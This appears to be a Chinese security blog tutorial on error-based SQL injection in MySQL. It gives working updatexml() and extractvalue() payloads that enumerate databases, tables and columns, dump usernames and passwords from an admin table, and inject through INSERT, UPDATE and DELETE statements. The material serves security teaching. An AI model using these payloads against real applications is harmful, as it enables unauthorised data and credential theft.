---
title: SQL注入之报错注入
tags:
  - web安全知识
categories:
  - web安全知识
copyright: true
abbrlink: c1d4abbf
date: 2020-03-05 11:36:19
---
**0x01 报错注入**

在实际场景中，没有一个数据的返回信息点。此时需要用报错注入使其显示出注入信息。

使用到报错注入的场景有：  
普通报错注入，即没有数据返回点  
insert注入  
update注入  
delete注入

**0x02 常用到的两个报错函数**

updatexml（）和extractvalue()函数

**0x03 updatexml函数**  
updatexml( (XML_document, XPath_string, new_value);  
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc  
第二个参数：XPath_string (Xpath格式的字符串)  
第三个参数：new_value，String格式，替换查找到的符合条件的数据

修改 XPath_string的格式，让其报错  
updatexml(1,concat(0x7e,(sql_inject的语句)),1)  
0x7e是16进制，相当于~

1.爆数据库  
updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select
schema_name),0x7e) from information_schema.schemata limit 0,1),0x7e),1)

2.爆表  
updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select
table_name),0x7e) FROM information_schema.tables limit 0,1),0x7e),1)

3.爆字段  
updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select
column_name),0x7e) from information_schema.columns limit 0,1),0x7e),1)

4.爆数据  
updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, username,password) from
jw_admin limit 0,1),0x7e),1)

**0x04 extractvalue函数**  
extractvalue函数的使用方法和updatexml一样  
报数据当前数据库  
extractvalue(,concat(0x7e,(select database()),0x7e))  
在数据库当中.号代表着下一级。  
只需要将updatexml更改为extractvalue

**0x05 其他**  
在insert、update、delect注入中,注意闭合  
or updatexml(1,(sql_inject语句)1) or  
or extractvalue(1,(sql_inject语句)1) or

insert注入：INSERT INTO users (id, username, password) VALUES (2,‘Pseudo_Z’ or
updatexml(1,concat(0x7e,(database())),0) or’’, ‘security-eng’);

update注入：UPDATE users SET password=‘security-eng’ or
updatexml(2,concat(0x7e,(database())),0) or’’ WHERE id=2 and
username=‘Pseudo_Z’;

delete注入：DELETE FROM users WHERE id=2 or
updatexml(1,concat(0x7e,(database())),0) or’’;

